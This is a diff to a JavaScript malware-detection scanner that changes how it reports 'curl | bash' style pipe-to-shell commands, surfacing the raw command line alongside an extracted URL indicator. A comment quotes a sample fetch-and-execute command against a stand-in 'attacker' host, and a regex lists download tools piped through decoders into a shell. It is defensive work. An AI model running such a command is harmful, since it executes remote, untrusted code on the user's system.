@@ -426,12 +426,20 @@ Object.assign(EncodedContentDetector.prototype, {
     // critical inside _processCommandObfuscation via _executeOutput).
     //
     // For the live-fetch variant the upstream URL *is* the payload —
-    // no transformation to recover. We extract the URL into `deobfuscated`
-    // and emit it as an IOC.URL via `_patternIocs`, and rely on the
-    // sibling YARA rule `Bash_Live_Fetch_Pipe_Shell` for structural
-    // detection parity. Label renamed from "Pipe-to-Shell (live fetch)"
-    // to "Pipe-to-Shell Pattern (live fetch)" to stop implying
-    // deobfuscation where none is performed.
+    // no transformation to recover. The `deobfuscated` field is set to
+    // the raw matched command (e.g. `curl -s http://attacker/x | bash`)
+    // rather than a synthesised `pipe-to-shell upstream: <URL>` label.
+    // Reasons:
+    //   • the raw command line IS the actionable artefact; synthesising
+    //     a breadcrumb string hides the real pattern from the sidebar
+    //     preview + the "Load for analysis" drill-down;
+    //   • `_patternIocs` already carries the upstream URL as an IOC.URL
+    //     with T1105 pattern metadata, so IOC emission doesn't depend
+    //     on parsing the synthesised string;
+    //   • loading a synthetic `"pipe-to-shell upstream: …"` text file
+    //     for re-analysis produces no useful findings (there's nothing
+    //     encoded in the breadcrumb), whereas loading the raw curl-pipe-
+    //     bash line re-runs the full scanner on the real command.
     const pipeShellRe = /\b(?:curl|wget|fetch|invoke-webrequest|iwr|irm)\b[^\r\n|]{0,400}\|\s*(?:base64\s+-(?:d|decode)\s*\|\s*)?(?:xxd\s+-r(?:\s+-p)?\s*\|\s*)?(?:rev\s*\|\s*)?(?:ba)?sh\b/gi;
     while ((m = pipeShellRe.exec(text)) !== null) {
       throwIfAborted();
@@ -439,19 +447,17 @@ Object.assign(EncodedContentDetector.prototype, {
       const raw = m[0];
       if (raw.length > 600) continue;
       // Extract the upstream URL (first https?:// in the match) — this
-      // is the actionable artefact, not the raw command line.
+      // is the actionable artefact; attached as an IOC.URL via
+      // `_patternIocs` below.
       const urlMatch = /https?:\/\/[^\s|'"`<>]{3,400}/.exec(raw);
       const upstreamUrl = urlMatch ? urlMatch[0] : null;
-      const resolved = upstreamUrl
-        ? `pipe-to-shell upstream: ${upstreamUrl}`
-        : `pipe-to-shell (dynamic upstream)`;
       candidates.push({
         type: 'cmd-obfuscation',
         technique: 'Bash Pipe-to-Shell (live fetch)',
         raw,
         offset: m.index,
         length: raw.length,
-        deobfuscated: resolved,
+        deobfuscated: raw,
         _executeOutput: true,
         _patternIocs: upstreamUrl ? [{
           url: `Bash live-fetch pipe-to-shell \u2014 fetches ${upstreamUrl} and pipes response to shell (T1105)`,
